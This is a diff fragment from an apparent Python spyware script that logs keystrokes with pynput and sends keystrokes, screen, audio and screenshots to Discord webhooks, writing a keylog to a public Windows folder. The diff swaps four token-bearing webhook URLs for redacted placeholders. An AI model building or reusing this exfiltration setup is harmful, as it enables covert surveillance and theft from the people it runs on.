@@ -11,10 +11,10 @@ from pynput import keyboard
 import schedule
 
 # Webhook URLs
-SCREEN_WEBHOOK_URL = "https://discord.com/api/webhooks/1252261362097192961/p0tzj_iJN8c-Iv3AdvPA-oNQBBwnzFnbRLAE5ibTCWvH93IMBxW3TarBbO1VNLAhMLTI"
-AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1259623619332411524/KdAhb0i7oTwfaFsHfhYfQJda5Cx7DgS5S7c27Fan_LAxN25A3KbPq3wqgaVY1vI_Eome"
-KEYLOGGER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1246901796782473329/rcIggVdzfYRUJVYMjJgZcRrc3Z8fWjEWEm83dmxB48kpM1erU04lp7GBX4CSlqy9rn5x'
-SCREENSHOT_WEBHOOK_URL = 'https://discord.com/api/webhooks/1244445585373794325/ZIlEfyS5C1HBedpugnAq_lOxgi538WzXQFszdga4SbPRzbILEfivhECVTNNRS2NCC6-5'
+SCREEN_WEBHOOK_URL = "Webhook-URL-LINK<REDACTED>"
+AUDIO_WEBHOOK_URL = "Webhook-URL-LINK<REDACTED>"
+KEYLOGGER_WEBHOOK_URL = "Webhook-URL-LINK<REDACTED>"
+SCREENSHOT_WEBHOOK_URL = "Webhook-URL-LINK<REDACTED>"
 
 # Path for keylog file
 KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"
